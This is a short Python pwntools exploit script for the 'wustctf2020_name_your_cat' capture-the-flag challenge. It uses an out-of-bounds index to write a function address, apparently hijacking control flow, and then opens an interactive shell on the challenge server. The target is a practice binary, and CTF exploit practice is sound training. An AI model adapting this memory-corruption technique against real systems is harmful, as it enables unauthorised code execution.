#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/05/24 15:11:40
@Author  :   eur1ka  
@Version :   2.7
@Contact :   raogx.vip@hotmail.com
@License :   (C)Copyright 2017-2018, Liugroup-NLPR-CASIA
@Desc    :   None
'''

# here put the import lib

from pwn import *
from LibcSearcher import *
import pwnlib
context.log_level = 'debug'
debug = 0
if debug:
    sh = process('wustctf2020_name_your_cat')
else:
    sh = remote('node3.buuoj.cn',25780)
elf = ELF('wustctf2020_name_your_cat')
# libc = ELF()
def fun(index,content):
    sh.recvuntil("Name for which?\n>")
    sh.sendline(str(index))
    sh.recvuntil("Give your name plz: ")
    sh.sendline(content)

fun(7,p32(0x80485CB))
for i in range(0,4):   
    fun(1,"1")

sh.interactive()

